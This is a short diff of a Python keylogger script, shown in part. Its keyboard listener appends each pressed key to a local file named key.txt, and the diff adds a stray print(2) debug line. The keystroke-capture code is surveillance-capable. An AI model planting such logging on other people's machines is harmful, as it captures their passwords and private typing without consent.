@@ -24,6 +24,7 @@ def on_press(key):
         text =text + str(key).strip("'")
     with open("key.txt", "a+") as file:
             file.write(text)
+            print(2)
             print(text)
 
 with keyboard.Listener(on_press=on_press) as listener:
